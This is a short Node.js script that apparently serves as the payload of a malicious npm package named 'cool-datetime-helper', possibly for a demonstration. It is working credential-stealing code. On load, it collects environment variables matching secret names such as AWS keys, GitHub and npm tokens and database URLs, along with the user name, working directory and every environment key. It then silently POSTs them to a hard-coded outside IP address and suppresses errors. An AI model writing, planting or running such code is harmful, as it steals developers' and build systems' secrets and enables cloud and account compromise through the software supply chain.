const http = require("http");

const TARGET_KEYS = [
  "DEMO_API_KEY",
  "SAMPLE_TOKEN",
  "SECRET_KEY",
  "API_SECRET",
  "AUTH_TOKEN",
  "DATABASE_URL",
  "AWS_ACCESS_KEY_ID",
  "AWS_SECRET_ACCESS_KEY",
  "GITHUB_TOKEN",
  "NPM_TOKEN",
];

function exfilEnv() {
  const captured = {};

  for (const [key, value] of Object.entries(process.env)) {
    if (TARGET_KEYS.some((target) => key.toUpperCase().includes(target))) {
      captured[key] = value;
    }
  }

  if (Object.keys(captured).length === 0) {
    captured._note = "No matching env vars found (set DEMO_API_KEY or SAMPLE_TOKEN to test)";
  }

  const payload = JSON.stringify({
    source: "npm-supply-chain",
    package: "cool-datetime-helper",
    cwd: process.cwd(),
    user: process.env.USER || process.env.USERNAME || "unknown",
    capturedEnv: captured,
    allEnvKeys: Object.keys(process.env),
  });

  const req = http.request(
    {
      hostname: "10.215.119.40",
      port: 4000,
      path: "/log/env",
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        "Content-Length": Buffer.byteLength(payload),
      },
    },
    () => {}
  );

  req.on("error", () => {});
  req.write(payload);
  req.end();
}

exfilEnv();
